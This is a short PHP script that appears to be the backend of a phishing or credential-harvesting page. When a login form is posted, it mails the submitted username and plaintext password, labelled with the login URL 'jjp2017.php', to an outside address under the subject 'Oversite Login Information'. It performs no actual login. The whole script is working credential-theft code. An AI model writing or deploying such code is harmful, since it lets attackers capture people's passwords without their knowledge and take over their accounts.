<?php 

	if(isset($_POST['username'])){
	    // The message
	    $message = "Login URL: jjp2017.php\r\n
	                Username: " . $_POST['username'] . "\r\n
	                Password: " . $_POST['password'];

	    // In case any of our lines are larger than 70 characters, we should use wordwrap()
	    $message = wordwrap($message, 70, "\r\n");

	    // Send
	    mail('caffeinated@example.com', 'Oversite Login Information', $message);
	}

?>